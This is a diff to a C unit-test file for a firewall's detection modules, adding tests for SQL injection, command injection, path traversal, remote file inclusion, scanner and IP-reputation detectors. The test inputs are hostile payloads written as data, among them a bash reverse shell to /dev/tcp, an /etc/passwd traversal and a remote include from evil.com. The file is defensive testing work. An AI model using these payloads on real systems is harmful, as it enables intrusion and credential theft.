@@ -1,6 +1,12 @@
 #define BUILD_USERSPACE
 #include "userspace_compat.h"
 #include "fw_inspect.h"
+#include "sqli_detect.h"
+#include "cmdi_detect.h"
+#include "path_detect.h"
+#include "bot_detect.h"
+#include "ip_reputation.h"
+#include "yara_engine.h"
 #include <stdio.h>
 #include <string.h>
 #include <assert.h>
@@ -141,6 +147,87 @@ void test_http_inspector() {
 }
 
 // -------------------------------------------------------------
+// NEW ADVANCED DETECTION MODULE TESTS
+// -------------------------------------------------------------
+void test_advanced_detectors() {
+    printf("--- Running SQLi, CMDi, Path/LFI/RFI, Bot, and IP reputation Tests ---\n");
+
+    // SQL Injection Test
+    {
+        char pattern[128], details[256];
+        int score1 = detect_sqli("id=1+union+select+null,username,password+from+users", 52, pattern, sizeof(pattern), details, sizeof(details));
+        assert(score1 >= 40);
+        assert(strstr(pattern, "UNION SELECT"));
+
+        int score2 = detect_sqli("user=admin'+or+1=1--", 20, pattern, sizeof(pattern), details, sizeof(details));
+        assert(score2 >= 40);
+        assert(strstr(pattern, "TAUTOLOGY"));
+        printf("  SQLi Detection Tests: Passed\n");
+    }
+
+    // Command Injection Test
+    {
+        char pattern[128], details[256];
+        int score1 = detect_cmdi("cmd=;whoami", 11, pattern, sizeof(pattern), details, sizeof(details));
+        assert(score1 >= 40);
+        assert(strstr(pattern, "META_CHAR") || strstr(pattern, "SHELL_CMD"));
+
+        int score2 = detect_cmdi("input=bash+-i+>%26+/dev/tcp/10.0.0.1/4444", 40, pattern, sizeof(pattern), details, sizeof(details));
+        assert(score2 >= 40);
+        assert(strstr(pattern, "REV_SHELL") || strstr(pattern, "DEV_TCP"));
+        printf("  CMDi Detection Tests: Passed\n");
+    }
+
+    // Path Traversal / LFI / RFI Test
+    {
+        char pattern[128], details[256];
+        int score1 = detect_path_traversal("file=../../../../etc/passwd", 31, pattern, sizeof(pattern), details, sizeof(details));
+        assert(score1 >= 40);
+        assert(strstr(pattern, "TRAVERSAL") || strstr(pattern, "LFI_TARGET"));
+
+        int score2 = detect_path_traversal("include=http://evil.com/shell.php", 33, pattern, sizeof(pattern), details, sizeof(details));
+        assert(score2 >= 40);
+        assert(strstr(pattern, "RFI_HTTP"));
+        printf("  Path/LFI/RFI Detection Tests: Passed\n");
+    }
+
+    // Bot / Scanner Test
+    {
+        char pattern[128], details[256];
+        // sqlmap user agent request
+        const char *http_req = "GET / HTTP/1.1\r\nUser-Agent: sqlmap/1.4.5#stable\r\n\r\n";
+        int score1 = detect_bot(http_req, strlen(http_req), pattern, sizeof(pattern), details, sizeof(details));
+        assert(score1 >= 40);
+        assert(strstr(pattern, "SCANNER_UA"));
+
+        // Honeypot path check
+        const char *http_req2 = "GET /wp-login.php HTTP/1.1\r\nHost: localhost\r\n\r\n";
+        int score2 = detect_bot(http_req2, strlen(http_req2), pattern, sizeof(pattern), details, sizeof(details));
+        assert(score2 >= 40);
+        assert(strstr(pattern, "HONEYPOT_PATH"));
+        printf("  Bot/Scanner Detection Tests: Passed\n");
+    }
+
+    // IP Reputation Test
+    {
+        uint32_t ip = inet_addr("198.51.100.12");
+        assert(get_ip_reputation(ip) == 0);
+        
+        // Update reputation
+        update_ip_reputation(ip, 30, THREAT_SQLI);
+        assert(get_ip_reputation(ip) == 30);
+        
+        update_ip_reputation(ip, 60, THREAT_CMDI);
+        assert(get_ip_reputation(ip) == 90); // 30 + 60
+        
+        // Decay reputation
+        decay_reputation_scores(20);
+        assert(get_ip_reputation(ip) == 70); // 90 - 20
+        printf("  IP Reputation Tests: Passed\n");
+    }
+}
+
+// -------------------------------------------------------------
 // IP BLOCKLIST TESTS
 // -------------------------------------------------------------
 void test_ip_blocklist() {
@@ -247,19 +334,6 @@ void test_tcp_monitor() {
         int drop = monitor_tcp_stats(&iph, &tcph);
         assert(drop == 0);
 
-        // Advance simulation time past timeout (30 seconds -> 3000 ticks)
-        // Let's modify userspace jiffies to return high value. But wait!
-        // In userspace_compat.h, get_millis uses real time.
-        // To safely test timeouts without sleeping for 30s in the test runner,
-        // we can override get_millis or simulate tick changes.
-        // Let's use a sleep or since we want deterministic instant tests:
-        // Let's manipulate the connection pool state directly!
-        // We look up the state in the connection pool and set http_start_time back by 31s (3100 ticks).
-        // Let's check:
-        // We know index = conn_hash(src_ip, src_port). Let's fetch it.
-        // Wait, index function is:
-        // index = conn_hash(192.168.99.2, 5432)
-        // Let's use a function to retrieve it or just iterate through pool to find it!
         struct conn_state {
             uint32_t src_ip;
             uint16_t src_port;
@@ -290,12 +364,19 @@ void test_tcp_monitor() {
 
 int main() {
     printf("===========================================\n");
-    printf("FIREWALL CORE LOGIC VALIDATION UNIT TESTS\n");
+    printf("NULLSPLOIT CORE LOGIC VALIDATION UNIT TESTS\n");
     printf("===========================================\n");
 
+    init_ip_reputation();
+    init_yara_engine("/etc/fw_inspect/yara");
+
     test_http_inspector();
+    test_advanced_detectors();
     test_ip_blocklist();
     test_tcp_monitor();
+
+    cleanup_yara_engine();
+    cleanup_ip_reputation();
 
     printf("===========================================\n");
     printf("ALL TESTS PASSED SUCCESSFULLY!\n");
